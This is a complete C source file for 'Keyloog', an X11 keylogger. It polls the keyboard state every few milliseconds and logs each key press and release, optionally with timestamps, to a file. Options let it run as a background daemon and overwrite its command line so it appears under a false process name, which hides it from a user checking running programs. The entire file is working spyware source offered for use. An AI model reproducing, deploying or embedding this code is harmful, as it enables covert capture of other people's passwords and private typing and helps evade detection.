#define _BSD_SOURCE // For usleep() and getdtablesize()
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>

#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <math.h>
#include <signal.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <X11/Xlib.h>

#ifndef PROGRAM_VERSION
#   define PROGRAM_VERSION "(unknown)"
#endif

void daemonize(const char *option_pidfile)
{
    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        exit(EXIT_FAILURE);
    } else if (pid > 0) {
        // Write child PID to file
        if (option_pidfile) {
            FILE *pidfile = fopen(option_pidfile, "w");
            if (!pidfile) {
                perror(option_pidfile);
                exit(EXIT_FAILURE);
            }
            fprintf(pidfile, "%d\n", pid);
            fclose(pidfile);
        }
        exit(EXIT_SUCCESS);
    }
    
    // Detach from controlling terminal
    setsid();
    
    for (int i = 0; i < 3; i++) {
        close(i);
        open("/dev/null", O_RDWR);
    }
}

// Signal handlers
bool end = false;

void signal_quit(int s)
{
    end = true;
}

void print_version()
{
    printf("Keyloog " PROGRAM_VERSION "\n");
}

void print_usage(const char *exec_name)
{
    printf("Usage: %s [OPTION]... [FILE]\n\n", exec_name);
    
    printf("  -a, --append          do not truncate output file\n");
    printf("  -s, --simple          log only key down events\n");
    printf("  -t, --time            log timestamps\n\n");
    
    printf("  -d, --daemonize       run in the background\n");
    printf("  -p, --pid-file=FILE   write PID to FILE\n\n");

    printf("      --spoof=NAME      change command line to NAME\n\n");
    
    printf("  -h, --help            display this help and exit\n");
    printf("      --version         output version information and exit\n");
}

int bit_offset(unsigned char x)
{
    return (int) log2((double) x);
}

void spoof_argv(int argc, char *argv[], char *spoof)
{
    strncpy(argv[0], spoof, strlen(argv[0]));
    for (int i = 1; i < argc; i++) {
        memset(argv[i], 0, strlen(argv[i]));
    }
}

int main(int argc, char *argv[])
{
    // Parse command-line options
    static struct option long_options[] = {
        {"append",      no_argument,        NULL, 'a'},
        {"simple",      no_argument,        NULL, 's'},
        {"time",        no_argument,        NULL, 't'},
        {"daemonize",   no_argument,        NULL, 'd'},
        {"pid-file",    required_argument,  NULL, 'p'},
        {"spoof",       required_argument,  NULL, 'o'},
        {"help",        no_argument,        NULL, 'h'},
        {"version",     no_argument,        NULL, 'v'},
        {0, 0, 0, 0}
    };
    
    bool option_daemonize = false, option_append = false, option_simple = false, option_time = false;
    char *option_pidfile = NULL, *option_file = NULL, *option_spoof = NULL;
    
    char o;
    while ((o = getopt_long(argc, argv, "astdp:h", long_options, NULL)) != -1) {
        switch (o) {
        case 'a':
            option_append = true;
            break;
        case 's':
            option_simple = true;
            break;
        case 't':
            option_time = true;
            break;
        case 'd':
            option_daemonize = true;
            break;
        case 'p':
            option_pidfile = optarg;
            break;
        case 'o':
            option_spoof = optarg;
            break;
        case 'h':
            print_usage(argv[0]);
            return 0;
        case 'v':
            print_version();
            return 0;
        case '?': // Unrecognized argument
            return 1;
        }
    }
    
    if (optind < argc)
        option_file = argv[optind];

    // Set up signals
    signal(SIGTERM, signal_quit);
    signal(SIGQUIT, signal_quit);
    signal(SIGINT, signal_quit);

    // Spoof argv
    if (option_spoof)
        spoof_argv(argc, argv, option_spoof);
    
    // Open X display
    Display *display = XOpenDisplay(NULL);
    if (!display) {
        fprintf(stderr, "Error: Could not open X display\n");
        exit(EXIT_FAILURE);
    }
    
    // Open output file
    FILE *file = stdout;
    if (option_file) {
        file = fopen(option_file, option_append ? "a" : "w");
        if (!file) {
            perror(option_file);
            exit(EXIT_FAILURE);
        }
    }

    // Daemonize
    if (option_daemonize)
        daemonize(option_pidfile);
    
    char keys_current[32], keys_last[32];
    
    XQueryKeymap(display, keys_last);
    while (!end) {
        fflush(file);
        usleep(5000);
        
        XQueryKeymap(display, keys_current);
        for (int i = 0; i < 32; i++) {
            if (keys_current[i] != keys_last[i]) {
                int keycode = i * 8 + bit_offset(keys_current[i] ^ keys_last[i]);
                int keysym = XKeycodeToKeysym(display, keycode, 0);
                char *key = XKeysymToString(keysym);

                time_t now = time(NULL);
                char *timestamp = ctime(&now);
                timestamp[strlen(timestamp)-1] = 0; // Strip \n

                if (option_simple && keys_current[i] > keys_last[i]) {
                    if (option_time)
                        fprintf(file, "[%s] %s\n", timestamp, key);
                    else
                        fprintf(file, "%s ", key);
                } else if (!option_simple) {
                    if (option_time)
                        fprintf(file, "[%s] %c%s\n", timestamp, (keys_current[i] < keys_last[i]) ? '-' : '+', key);
                    else
                        fprintf(file, "%c%s ", (keys_current[i] < keys_last[i]) ? '-' : '+', key);
                }
            }
            keys_last[i] = keys_current[i];
        }
    }
    
    XCloseDisplay(display);
    fclose(file);
    
    return EXIT_SUCCESS;
}
